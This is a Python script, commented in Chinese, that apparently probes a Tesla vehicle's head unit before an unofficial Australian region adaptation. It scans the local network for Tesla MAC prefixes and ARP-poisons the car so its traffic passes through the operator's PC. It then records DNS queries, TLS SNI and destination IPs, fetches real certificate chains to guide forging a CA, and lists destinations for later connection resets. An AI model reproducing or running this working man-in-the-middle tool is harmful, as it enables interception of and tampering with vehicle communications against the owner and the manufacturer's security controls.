#!/usr/bin/env python
r"""
probe_au.py — 上新地区前的摸底工具（澳洲适配用，只观察不拦截）

三个模式：
  discover  扫本机所在 /24，列出在线主机和 MAC，标注是否 Tesla
  sniff     引流（或直连网关模式）旁听车机流量：DNS 查询 + TLS SNI + 目的 IP
  cert      从本机直连某域名的 443，打印真实证书的签发链（决定伪造哪条 CA）

用法（一般由 probe_au.ps1 编排，不必手敲）：
    python tools\probe_au.py discover --iface Wi-Fi
    python tools\probe_au.py sniff --iface Wi-Fi --target 192.168.199.95 \
        --gateway 192.168.199.1 --our-ip 192.168.199.148 --duration 300
    python tools\probe_au.py sniff --iface Wi-Fi --target 192.168.137.42 \
        --no-poison --duration 300          # 热点模式：PC 本身就是网关
    python tools\probe_au.py cert --domain api-prd.vn.teslamotors.com

产物：logs\probe_au.log + logs\probe_au_report.json
"""
from __future__ import annotations

import argparse
import concurrent.futures
import ipaddress
import json
import os
import re
import socket
import ssl
import subprocess
import sys
import threading
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOGS = os.path.join(ROOT, "logs")
LOG_PATH = os.path.join(LOGS, "probe_au.log")
REPORT_PATH = os.path.join(LOGS, "probe_au_report.json")
NO_WIN = 0x08000000 if os.name == "nt" else 0

# Tesla 已知 OUI；车机也可能用随机化 MAC，discover 会把全部在线主机列出来兜底
TESLA_OUIS = {"4c:fcaa", "98:00c6"}  # 前缀匹配用 (mac[:8])
TESLA_PREFIXES = ("4c:fc:aa", "98:00:c6")

TESLA_HINT = re.compile(r"(tesla|teslamotors|mothership|api-prd|hermes|vehicle)", re.I)
LOCK = threading.Lock()


def log(msg: str) -> None:
    line = f"{time.strftime('%Y-%m-%d %H:%M:%S')} {msg}"
    print(line, flush=True)
    with LOCK:
        try:
            with open(LOG_PATH, "a", encoding="utf-8") as fh:
                fh.write(line + "\n")
        except OSError:
            pass


def load_scapy():
    try:
        from scapy.all import (ARP, DNS, IP, TCP, UDP, Ether, Raw, conf, getmacbyip,
                               sendp, sniff)
        return dict(ARP=ARP, DNS=DNS, IP=IP, TCP=TCP, UDP=UDP, Ether=Ether, Raw=Raw,
                    conf=conf, getmacbyip=getmacbyip, sendp=sendp, sniff=sniff)
    except Exception as exc:  # noqa: BLE001
        log(f"scapy 导入失败：{exc}（先跑 install.ps1 建 venv，再用 venv 的 python）")
        sys.exit(2)


# ---------------------------------------------------------------- discover

def _ping_one(ip: str) -> str | None:
    try:
        out = subprocess.run(["ping", "-n", "1", "-w", "300", ip],
                             capture_output=True, text=True,
                             creationflags=NO_WIN).stdout or ""
        return ip if ("TTL=" in out or "ttl=" in out) else None
    except Exception:  # noqa: BLE001
        return None


def is_tesla_mac(mac: str) -> bool:
    return any(mac.startswith(p) for p in TESLA_PREFIXES)


def vendor_of(mac: str) -> str:
    if is_tesla_mac(mac):
        return "Tesla?"
    if mac.startswith("00:1a:11") or mac.startswith("d8:f1:5e"):
        return "phone/other"
    return ""


def cmd_discover(args) -> int:
    net = ipaddress.ip_network(f"{args.our_ip}/24", strict=False)
    hosts = [str(h) for h in net.hosts() if str(h) != args.our_ip]
    log(f"discover: 扫 {net} （本机 {args.our_ip}）")
    alive: set[str] = set()
    with concurrent.futures.ThreadPoolExecutor(max_workers=60) as ex:
        for r in ex.map(_ping_one, hosts):
            if r:
                alive.add(r)
    # arp -a 兜底（车机可能禁 ping）
    try:
        out = subprocess.run(["arp", "-a"], capture_output=True, text=True,
                             creationflags=NO_WIN).stdout or ""
        for m in re.finditer(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f]{2}(?:-[0-9a-f]{2}){5})", out, re.I):
            ip, mac = m.group(1), m.group(2).replace("-", ":").lower()
            if str(net.network_address) in ip and not ip.endswith(".255"):
                alive.add(ip)
                MAC_CACHE[ip] = mac
    except Exception:  # noqa: BLE001
        pass
    rows = []
    for ip in sorted(alive, key=lambda x: tuple(int(p) for p in x.split("."))):
        mac = MAC_CACHE.get(ip) or resolve_mac(ip, args.iface) or ""
        rows.append({"ip": ip, "mac": mac, "tesla": is_tesla_mac(mac),
                     "vendor": vendor_of(mac)})
    tesla = [r for r in rows if r["tesla"]]
    report = {"mode": "discover", "our_ip": args.our_ip, "hosts": rows,
              "tesla_candidates": [r["ip"] for r in tesla]}
    save_report(report)
    log(f"在线 {len(rows)} 台，Tesla 候选：{[r['ip'] for r in tesla] or '无 —— 看下方列表手工挑'}")
    for r in rows:
        log(f"  {r['ip']:16} {r['mac']:18} {r['vendor']}")
    return 0


MAC_CACHE: dict[str, str] = {}


def resolve_mac(ip: str, iface: str, tries: int = 5) -> str | None:
    if ip in MAC_CACHE:
        return MAC_CACHE[ip]
    S = load_scapy()
    for _ in range(tries):
        mac = S["getmacbyip"](ip)
        if mac:
            MAC_CACHE[ip] = mac.lower()
            return mac.lower()
        _ping_one(ip)
    try:
        out = subprocess.run(["arp", "-a", ip], capture_output=True, text=True,
                             creationflags=NO_WIN).stdout or ""
        m = re.search(r"([0-9a-f]{2}(?:-[0-9a-f]{2}){5})", out, re.I)
        if m:
            MAC_CACHE[ip] = m.group(1).replace("-", ":").lower()
            return MAC_CACHE[ip]
    except Exception:  # noqa: BLE001
        pass
    return None


# ---------------------------------------------------------------- sniff

def tls_sni(payload: bytes) -> str | None:
    try:
        if len(payload) < 6 or payload[0] != 0x16:
            return None
        rec_len = int.from_bytes(payload[3:5], "big")
        hs = payload[5:5 + rec_len]
        if len(hs) < 5 or hs[0] != 0x01:
            return None
        body = hs[4:]
        i = 0
        i += 2 + 32
        sid_len = body[i]; i += 1 + sid_len
        cs_len = int.from_bytes(body[i:i + 2], "big"); i += 2 + cs_len
        comp_len = body[i]; i += 1 + comp_len
        ext_total = int.from_bytes(body[i:i + 2], "big"); i += 2
        end = min(len(body), i + ext_total)
        while i + 4 <= end:
            etype = int.from_bytes(body[i:i + 2], "big")
            elen = int.from_bytes(body[i + 2:i + 4], "big")
            i += 4
            if etype == 0:
                if i + 5 > len(body):
                    return None
                nlen = int.from_bytes(body[i + 3:i + 5], "big")
                return body[i + 5:i + 5 + nlen].decode("latin1").lower()
            i += elen
    except Exception:  # noqa: BLE001
        return None
    return None


def cmd_sniff(args) -> int:
    S = load_scapy()
    iface = S["conf"].ifaces.dev_from_name(args.iface).name
    our_mac = S["conf"].ifaces.dev_from_name(args.iface).mac
    log(f"sniff: iface={iface} our={args.our_ip}/{our_mac} target={args.target} "
        f"poison={'no' if args.no_poison else 'yes'} duration={args.duration}s")

    sni_seen: dict[str, str] = {}      # sni -> dst ip
    dns_seen: set[tuple[str, str]] = set()   # (qname, dst)
    flow443: dict[str, int] = {}       # dst ip -> pkts
    stop = threading.Event()

    target_mac = gw_mac = None
    if not args.no_poison:
        target_mac = resolve_mac(args.target, iface)
        gw_mac = resolve_mac(args.gateway, iface)
        if not target_mac or not gw_mac:
            log(f"MAC 解析失败 target={target_mac} gateway={gw_mac}")
            return 2
        frame = (S["Ether"](src=our_mac, dst=target_mac) /
                 S["ARP"](op=2, psrc=args.gateway, pdst=args.target,
                          hwsrc=our_mac, hwdst=target_mac))

        def poison_loop():
            while not stop.is_set():
                try:
                    S["sendp"](frame, iface=iface, verbose=False)
                except Exception as exc:  # noqa: BLE001
                    log(f"poison error: {exc}")
                stop.wait(1.0)
        threading.Thread(target=poison_loop, daemon=True).start()
        log(f"poison: {args.target} 认为 {args.gateway} = {our_mac}（只观察：DNS 全放行、无 RST）")

    def restore():
        if target_mac and gw_mac:
            f = (S["Ether"](src=gw_mac, dst=target_mac) /
                 S["ARP"](op=2, psrc=args.gateway, pdst=args.target,
                          hwsrc=gw_mac, hwdst=target_mac))
            for _ in range(3):
                try:
                    S["sendp"](f, iface=iface, verbose=False)
                except Exception:  # noqa: BLE001
                    pass
                time.sleep(0.3)
            log("restore: 网关 ARP 已还原")

    def forward_dns_reply(pkt, reply: bytes):
        try:
            S["sendp"](S["Ether"](src=our_mac, dst=target_mac) /
                       S["IP"](src=pkt["IP"].dst, dst=args.target) /
                       S["UDP"](sport=53, dport=pkt["UDP"].sport) / S["Raw"](load=reply),
                       iface=iface, verbose=False)
        except Exception as exc:  # noqa: BLE001
            log(f"dns reply error: {exc}")

    def handle(pkt):
        try:
            if S["IP"] not in pkt:
                return
            ip = pkt[S["IP"]]
            if ip.src != args.target:
                return
            if S["UDP"] in pkt and pkt[S["UDP"]].dport == 53 and S["DNS"] in pkt \
                    and pkt[S["DNS"]].qr == 0 and pkt[S["DNS"]].qd is not None:
                qname = pkt[S["DNS"]].qd.qname.decode("latin1").rstrip(".").lower()
                key = (qname, ip.dst)
                if key not in dns_seen:
                    dns_seen.add(key)
                    log(f"DNS  {qname:48} -> server {ip.dst}"
                        + ("   *** tesla ***" if TESLA_HINT.search(qname) else ""))
                if not args.no_poison:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.settimeout(2.0)
                        s.sendto(bytes(pkt[S["UDP"]].payload), (args.upstream, 53))
                        reply, _ = s.recvfrom(4096)
                        s.close()
                        forward_dns_reply(pkt, reply)
                    except OSError as exc:
                        log(f"dns forward fail {qname}: {exc}")
                return
            if S["TCP"] in pkt:
                dst, dport = ip.dst, int(pkt[S["TCP"]].dport)
                if dport == 443:
                    flow443[dst] = flow443.get(dst, 0) + 1
                raw = bytes(pkt[S["TCP"]].payload)
                if raw and raw[0] == 0x16 and len(raw) > 40:
                    sni = tls_sni(raw)
                    if sni and sni not in sni_seen:
                        sni_seen[sni] = dst
                        log(f"SNI  {sni:48} -> {dst}:{dport}"
                            + ("   *** tesla ***" if TESLA_HINT.search(sni) else ""))
                if not args.no_poison and ip.dst != args.our_ip:
                    try:
                        fwd = pkt.copy()
                        fwd[S["Ether"]].src = our_mac
                        fwd[S["Ether"]].dst = gw_mac
                        S["sendp"](fwd, iface=iface, verbose=False)
                    except Exception:  # noqa: BLE001
                        pass
        except Exception as exc:  # noqa: BLE001
            log(f"handle error: {type(exc).__name__}: {exc}")

    end = time.time() + args.duration
    try:
        while time.time() < end:
            S["sniff"](iface=iface, prn=handle, store=False, timeout=10,
                       filter=f"ether src {target_mac}" if target_mac else
                              f"ip src {args.target}")
    except KeyboardInterrupt:
        log("手动中断")
    finally:
        stop.set()
        restore()

    tesla_sni = {s: d for s, d in sni_seen.items() if TESLA_HINT.search(s)}
    tesla_dns = sorted({q for q, _ in dns_seen if TESLA_HINT.search(q)})
    report = {
        "mode": "sniff", "our_ip": args.our_ip, "target": args.target,
        "poison": not args.no_poison, "duration": args.duration,
        "sni": sni_seen, "tesla_sni": tesla_sni,
        "dns_queries": sorted(q for q, _ in dns_seen), "tesla_dns": tesla_dns,
        "dst_443": sorted(flow443, key=flow443.get, reverse=True),
        "suggested_rst_dst": sorted(set(tesla_sni.values())),
    }
    save_report(report)
    log(f"完成：SNI {len(sni_seen)} 条（tesla {len(tesla_sni)}），"
        f"DNS {len(dns_seen)} 条（tesla {len(tesla_dns)}），报告 {REPORT_PATH}")
    return 0


# ---------------------------------------------------------------- cert

def cmd_cert(args) -> int:
    log(f"cert: 直连 {args.domain}:443 拿真实证书链")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with socket.create_connection((args.domain, 443), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=args.domain) as ss:
                cert = ss.getpeercert()
                der = ss.getpeercert(binary_form=True)
    except Exception as exc:  # noqa: BLE001
        log(f"连接失败：{exc}")
        return 1
    pem = ssl.DER_cert_to_PEM_cert(der)
    issuer = " / ".join("=".join(x) for x in cert.get("issuer", ()))
    subject = " / ".join("=".join(x) for x in cert.get("subject", ()))
    log(f"subject : {subject}")
    log(f"issuer  : {issuer}")
    log(f"notAfter: {cert.get('notAfter')}")
    save_report({"mode": "cert", "domain": args.domain, "issuer": issuer,
                 "subject": subject, "not_after": cert.get("notAfter"), "pem": pem})
    log(f"完整 PEM 已写入报告（伪造 CA 就按这条 issuer 链做）")
    return 0


# ---------------------------------------------------------------- util

def save_report(obj: dict) -> None:
    os.makedirs(LOGS, exist_ok=True)
    old: dict = {}
    try:
        with open(REPORT_PATH, encoding="utf-8") as fh:
            old = json.load(fh)
    except (OSError, ValueError):
        pass
    old.update({k: v for k, v in obj.items() if k != "pem"})
    if "pem" in obj:
        old.setdefault("certs", {})[obj.get("domain", "?")] = obj["pem"]
    try:
        with open(REPORT_PATH, "w", encoding="utf-8") as fh:
            json.dump(old, fh, ensure_ascii=False, indent=2)
    except OSError as exc:
        log(f"写报告失败：{exc}")


def main() -> int:
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="mode", required=True)

    d = sub.add_parser("discover")
    d.add_argument("--iface", default="Wi-Fi")
    d.add_argument("--our-ip", required=True)

    s = sub.add_parser("sniff")
    s.add_argument("--iface", default="Wi-Fi")
    s.add_argument("--target", required=True)
    s.add_argument("--gateway", default="")
    s.add_argument("--our-ip", required=True)
    s.add_argument("--duration", type=int, default=300)
    s.add_argument("--upstream", default="223.5.5.5")
    s.add_argument("--no-poison", action="store_true",
                   help="热点模式：PC 本身就是网关，不投毒只旁听")

    c = sub.add_parser("cert")
    c.add_argument("--domain", required=True)

    args = ap.parse_args()
    os.makedirs(LOGS, exist_ok=True)
    return {"discover": cmd_discover, "sniff": cmd_sniff, "cert": cmd_cert}[args.mode](args)


if __name__ == "__main__":
    sys.exit(main())
